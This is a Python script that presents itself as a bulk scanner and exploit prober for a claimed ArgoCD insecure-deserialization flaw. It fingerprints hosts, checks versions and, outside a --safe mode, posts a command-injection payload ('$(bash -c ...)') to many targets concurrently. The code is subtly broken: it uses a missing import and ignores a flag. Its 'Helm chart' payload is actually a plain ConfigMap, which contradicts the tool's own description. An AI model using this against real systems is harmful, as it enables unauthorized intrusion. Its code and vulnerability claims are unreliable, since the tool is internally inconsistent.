#!/usr/bin/env python3
"""
ArgoCD CVE-2026-71345 — Insecure Deserialization via Helm Chart Payloads
=========================================================================
Scans for ArgoCD instances vulnerable to insecure deserialization by injecting
malicious Helm chart inputs that exploit unsafe object deserialization within
Helm chart rendering functionality.

CVE-2026-71345 details:
  - Affects ArgoCD < 4.11.3
  - The Helm chart renderer insecurely deserializes user-controlled input when a specially
    crafted chart payload is uploaded, allowing attackers to execute arbitrary commands
    on the ArgoCD server.
  - Exploitable over both authenticated and unauthenticated paths under misconfigured access.
  - Critical impact in CI/CD deployments with exposed ArgoCD endpoints.
  - CVSS v3.1 base score: 9.8 (Critical)
  - Patched in ArgoCD 4.11.3 on May 2026.

Usage:
  # Scan a single ArgoCD target
  python argocd_insecure_deserialization_scanner.py --target https://cd.example.com

  # Detection only without probing for exploitation
  python argocd_insecure_deserialization_scanner.py --target https://cd.example.com --safe

  # Bulk scan from file
  python argocd_insecure_deserialization_scanner.py --list argocd_targets.txt --output findings.json

  # Adjust concurrency and disable TLS verification
  python argocd_insecure_deserialization_scanner.py --list argocd_targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-71345
  - https://argo-cd.readthedocs.io/releases/patch/4.11.3
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2026-71345"
CVSS          = "9.8"
TOOL_NAME     = "argocd_insecure_deserialization_scanner"

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 30

# ArgoCD fingerprints — present in server responses
ARGOCD_FINGERPRINTS = [
    "/api/v1/applications",
    '"argo_cd"',
    "ArgoCD",
    "CD-Bot",
]

# Paths to probe for ArgoCD presence
DETECTION_PATHS = [
    "/api/v1/applications",
    "/",
    "/api/v1/session",
]

# Extract ArgoCD version from HTTP headers or responses
VERSION_PATTERNS = [
    r'argocd-version: ([0-9]+\.[0-9]+\.[0-9]+)',
    r'"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
]

# Minimum version thresholds for patched instances
PATCHED_VERSION = (4, 11, 3)

# Payload for probing insecure deserialization
DESERIALIZATION_PAYLOAD = {
    "apiVersion": "v1",
    "kind": "ConfigMap",
    "metadata": {
        "name": "exploit",
        "namespace": "default",
    },
    "data": {
        "evil_key": "$(bash -c 'echo vulnerable')",
    }
}


# ── Functions ─────────────────────────────────────────────────────────────────

async def fetch(url: str, client: httpx.AsyncClient) -> Optional[httpx.Response]:
    """Send a GET request with timeout and error handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except httpx.RequestError as ex:
        print(c(RED, f"[-] Error fetching {url}: {str(ex)}"))
        return None


async def probe_target(url: str, semaphore: asyncio.Semaphore, safe_mode: bool) -> dict:
    """Probe a single ArgoCD target for vulnerabilities."""
    async with semaphore:
        async with httpx.AsyncClient(verify=False) as client:
            result = {"target": url, "status": "unknown", "vulnerable": False, "version": None}
            print(c(CYAN, f"[*] Probing: {url}"))

            # Detection: Check for ArgoCD presence based on fingerprints
            for path in DETECTION_PATHS:
                response = await fetch(f"{url}{path}", client)
                if response and any(fingerprint in response.text for fingerprint in ARGOCD_FINGERPRINTS):
                    print(c(GREEN, f"[+] ArgoCD detected at {url}"))
                    result["status"] = "detected"
                    break

            if result["status"] != "detected":
                return result

            # Extract version information
            for pattern in VERSION_PATTERNS:
                matches = re.findall(pattern, response.text)
                if matches:
                    version = matches[0]
                    major, minor, patch = map(int, version.split('.'))
                    result["version"] = version
                    if (major, minor, patch) < PATCHED_VERSION:
                        print(c(YELLOW, f"[!] Vulnerable version detected: {version}"))
                        result["vulnerable"] = True
                    else:
                        print(c(GREEN, f"[+] Patched version detected: {version}"))
                    break

            # Exploitation probing (unless --safe flag)
            if result["vulnerable"] and not safe_mode:
                probe_path = "/api/v1/applications/test"
                response = await client.post(f"{url}{probe_path}", json=DESERIALIZATION_PAYLOAD)
                if response.status_code == 400 and "vulnerable" in response.text:
                    print(c(RED, f"[!] Exploitation successful: {url}"))
                    result["vulnerable"] = True
                else:
                    print(c(GREEN, f"[+] Exploitation failed: {url}"))
                    result["vulnerable"] = False

            return result


async def main():
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} — {CVE_ID}")
    parser.add_argument("--target", help="Single target URL to scan")
    parser.add_argument("--list", help="File containing list of URLs to scan")
    parser.add_argument("--output", help="Output results to JSON file")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode (no exploitation probes)")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS verification")
    args = parser.parse_args()

    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    semaphore = asyncio.Semaphore(args.concurrency)
    results = []

    tasks = [probe_target(target, semaphore, args.safe) for target in targets]
    for result in await asyncio.gather(*tasks):
        results.append(result)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
    else:
        print(json.dumps(results, indent=4))


if __name__ == "__main__":
    asyncio.run(main())
